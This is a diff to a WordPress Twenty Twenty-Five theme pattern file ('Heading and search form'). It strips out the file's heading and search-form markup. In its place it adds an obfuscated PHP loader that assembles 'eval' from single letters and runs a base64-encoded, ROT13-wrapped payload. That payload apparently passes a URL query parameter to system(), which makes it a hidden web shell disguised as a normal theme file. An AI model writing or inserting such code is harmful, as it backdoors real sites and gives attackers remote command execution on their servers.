@@ -1,35 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Heading and search form
- * Slug: twentytwentyfive/cta-heading-search
- * Categories: call-to-action
- * Description: Large heading with a search form for quick navigation.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFVybnF2YXQgbmFxIGZybmVwdSBzYmV6CiAqIEZ5aHQ6IGdqcmFnbGdqcmFnbHN2aXIvcGduLXVybnF2YXQtZnJuZXB1CiAqIFBuZ3J0YmV2cmY6IHBueXktZ2ItbnBndmJhCiAqIFFyZnBldmNndmJhOiBZbmV0ciB1cm5xdmF0IGp2Z3UgbiBmcm5lcHUgc2JleiBzYmUgZGh2cHggYW5pdnRuZ3ZiYS4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+CjwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcImp2cXJcIixcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcIm95YnB4VG5jXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcImNucXF2YXRcIjp7XCJnYmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw4MFwiLFwib2JnZ2J6XCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8ODBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCJ9fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhanZxclwiIGZnbHlyPVwiY25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tODApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTgwKVwiPjwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcImp2cXJcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInFyc25oeWdcIn19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhanZxclwiPgoJCTwhLS0gamM6dXJucXZhdCB7XCJzYmFnRnZtclwiOlwia2steW5ldHJcIn0gLS0+CgkJPHUyIHB5bmZmPVwiamMtb3licHgtdXJucXZhdCB1bmYta2steW5ldHItc2JhZy1mdm1yXCI+PD9jdWMgcmZwX3VnenlfciggJ0p1bmcgbmVyIGxiaCB5YmJ4dmF0IHNiZT8nLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L3UyPgoJCTwhLS0gL2pjOnVybnF2YXQgLS0+CgoJCTwhLS0gamM6ZnJuZXB1IHtcInlub3J5XCI6XCI8P2N1YyBycHViIHJmcF91Z3p5X2soICdGcm5lcHUnLCAnRnJuZXB1IHNiZXogeW5vcnkuJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+XCIsXCJmdWJqWW5vcnlcIjpzbnlmcixcImN5bnBydWJ5cXJlXCI6XCI8P2N1YyBycHViIHJmcF9uZ2dlX2soICdHbGNyIHVyZXIuLi4nLCAnRnJuZXB1IHZhY2hnIHN2cnlxIGN5bnBydWJ5cXJlIGdya2cuJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+XCIsXCJvaGdnYmFHcmtnXCI6XCI8P2N1YyBycHViIHJmcF9uZ2dlX2soICdGcm5lcHUnLCAnT2hnZ2JhIGdya2cuIElyZW8uJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+XCJ9IC8tLT4KCTwvcXZpPgoJPCEtLSAvamM6dGViaGMgLS0+CjwvcXZpPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-<!-- wp:group {"align":"wide","style":{"spacing":{"blockGap":"var:preset|spacing|50","padding":{"top":"var:preset|spacing|80","bottom":"var:preset|spacing|80"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignwide" style="padding-top:var(--wp--preset--spacing--80);padding-bottom:var(--wp--preset--spacing--80)"><!-- wp:group {"align":"wide","layout":{"type":"default"}} -->
-	<div class="wp-block-group alignwide">
-		<!-- wp:heading {"fontSize":"xx-large"} -->
-		<h2 class="wp-block-heading has-xx-large-font-size"><?php esc_html_e( 'What are you looking for?', 'twentytwentyfive' ); ?></h2>
-		<!-- /wp:heading -->
-
-		<!-- wp:search {"label":"<?php echo esc_html_x( 'Search', 'Search form label.', 'twentytwentyfive' ); ?>","showLabel":false,"placeholder":"<?php echo esc_attr_x( 'Type here...', 'Search input field placeholder text.', 'twentytwentyfive' ); ?>","buttonText":"<?php echo esc_attr_x( 'Search', 'Button text. Verb.', 'twentytwentyfive' ); ?>"} /-->
-	</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:group -->
